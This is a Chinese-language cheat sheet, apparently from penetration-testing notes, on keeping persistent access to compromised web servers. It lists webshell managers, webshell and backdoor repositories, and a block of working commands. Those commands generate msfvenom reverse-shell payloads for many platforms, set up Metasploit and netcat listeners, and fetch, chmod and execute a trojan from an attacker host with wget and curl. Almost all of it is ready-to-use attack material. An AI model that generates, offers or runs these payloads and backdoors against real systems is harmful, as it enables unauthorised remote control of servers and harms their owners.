Web持久化
----------------------------------------

WebShell管理工具
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `菜刀 <https://github.com/Chora10/Cknife>`_
	+ 支持asp，jsp，php，不支持HTTPS。
	+ 一句话木马通用后门。
- `Cknife <https://github.com/Chora10/Cknife>`_
	+ 支持asp，jsp，php，支持HTTPS。
	+ 一句话木马通用后门。
- `antSword <https://github.com/antoor/antSword>`_
	+ 支持asp，jsp，php。
	+ 一句话木马通用后门。
- `冰蝎 <https://github.com/rebeyond/Behinder>`_
	+ 动态二进制加密网站管理客户端，支持java,.net,php，HTTPS。
	+ 非通用后门。
- `天蝎Skyscorpion <https://github.com/shack2/skyscorpion>`_
	+ 采用 Java平台的 JavaFX 技术开发的桌面客户端，支持跨平台运行，目前基于JDK1.8开发，天蝎权限管理工具基于冰蝎加密流量进行 WebShell通信管理的原理。
	+ 目前实现了jsp、aspx、php、asp端的常用操作功能，在原基础上，优化了大文件上传下载、Socket代理的问题，修改了部分API接口代码。
- `Altman <https://github.com/keepwn/Altman>`_ 
	+ 支持asp，jsp，php。
- `Webshell Sniper <https://github.com/WangYihang/Webshell-Sniper>`_ 
	+ 仅支持在类Unix系统上运行。
- `quasibot <https://github.com/Smaash/quasibot>`_ complex webshell manager, quasi-http botnet
- webacoo
	+ 仅支持PHP，非通用后门。
	+ 生成webshell： ``webacoo -g -o webacootest.php`` 
	+ 连接后门： ``webacoo -t -u http://106.54.74.40/webacootest.php`` 
- `weevely3 <https://github.com/epinna/weevely3>`_ Weaponized web shell
	+ 仅支持PHP，非通用后门。
	+ 生成webshell： ``weevely generate weevelytest ./weevelyphp.php`` 
	+ 连接后门： ``weevely http://106.54.74.40/weevelyphp.php weevelytest`` 
	+ 连接成功后，输入help，可以查看支持的命令和功能，注意执行模板命令需要加:号。
- `Godzilla哥斯拉 <https://github.com/BeichenDream/Godzilla>`_
	+ 支持asp，jsp，php，支持HTTPS。
	+ 非通用后门。
- Metasploit生成后门
	+ 基本参数
		::
		
			e 编码方式
			i 编码次数
			b 在生成的程序中避免出现的值
			f 输出格式
			p 选择payload
			l 查看所有payload
			a 选择架构平台(x86|x64|x86_64)
			o 文件输出
			c 添加自己的shellcode
			x|k 捆绑
	+ 基本格式：``msfvenom -p <payload> <payload options> -f <format> -o <path>``
	+ 示例
		::
		
			Binaries
				Linux：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
				Windows：msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
				Mac：msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
				Android：msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R > shell.apk
			Web Payloads
				php：msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
					cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
				asp：msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
				jsp：msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
				WAR：msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
			Scripting Payloads
				Python：msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
				Bash：msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
				Perl：msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
			Shellcode
				Linux Based Shellcode：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
				Windows Based Shellcode ：msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
				Mac Based Shellcode：msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
	+ Handlers
		::
		
			use exploit/multi/handler
			set PAYLOAD <Payload name>
			set LHOST <LHOST value>
			set LPORT <LPORT value>
			set ExitOnSession false
			exploit -j -z
			或
			nc -lvp port
			
	+ 上传木马
		::
		
			命令执行上传：
			system('wget http://10.10.10.131/shell_x64.elf -P /tmp/')
			
	+ 执行木马
		::
		
			system('chmod 777 /tmp/shell_x64.elf')
			system('/tmp/shell_x64.elf')
			注意tmp目录有写入执行权限。
		
			web页面：system("curl http://10.10.10.131/shell.asp")
	+ 交互
		::
		
			进入交互页面meterpreter会话执行以下：
			shell
			python -c "import pty;pty.spawn('/bin/bash')"

- Platypus【Linux】
	+ 支持多会话的交互式反向 Shell 管理器。
	+ 在多会话管理的基础上增加了在渗透测试中更加有用的功能（如：交互式 Shell、文件操作、隧道等），可以更方便灵活地对反向 Shell 会话进行管理。
	+ 项目地址：``https://github.com/WangYihang/Platypus``
	+ 帮助：``https://platypus-reverse-shell.vercel.app/quick-start/``

WebShell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `php-reverse-shell <http://pentestmonkey.net/tools/web-shells/php-reverse-shell>`_
	+ ``$ip = '127.0.0.1';  // CHANGE THIS``
	+ ``$port = 3333;       // CHANGE THIS``
	+ 注意根据实际情况需要修改(若sh如何指向dash，为非交互的shell)：``$shell = 'uname -a; w; id; /bin/sh -i';->$shell = 'uname -a; w; id; /bin/bash -i';``
- `webshell <https://github.com/tennc/webshell>`_
- `PHP backdoors <https://github.com/bartblaze/PHP-backdoors>`_
- `php bash - semi-interactive web shell <https://github.com/Arrexel/phpbash>`_
- `Python RSA Encrypted Shell <https://github.com/Eitenne/TopHat.git>`_
- `b374k - PHP WebShell Custom Tool <https://github.com/b374k/b374k>`_
- `c99shell <https://github.com/KaizenLouie/C99Shell-PHP7>`_
- `wso <https://github.com/phpFileManager/WSO>`_
- `JSPSPY <https://www.webshell.cc/wp-content/uploads/2013/09/ASPXspy2.rar>`_
- `ASPXSPY <https://www.webshell.cc/wp-content/uploads/2013/09/ASPXspy2.rar>`_
- `phpspy <https://www.webshell.cc/wp-content/uploads/2013/09/phpspy.rar>`_
- ``/usr/share/webshells/*`` 
- `revshells.com在线shell生成 <https://www.revshells.com/>`_

Web后门
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `pwnginx <https://github.com/t57root/pwnginx>`_
- `Apache backdoor <https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor>`_
- `SharpGen <https://github.com/cobbr/SharpGen>`_  .NET Core console application that utilizes the Rosyln C# compiler to quickly cross-compile .NET Framework console applications or libraries
- `IIS-Raid <https://github.com/0x09AL/IIS-Raid>`_ A native backdoor module for Microsoft IIS
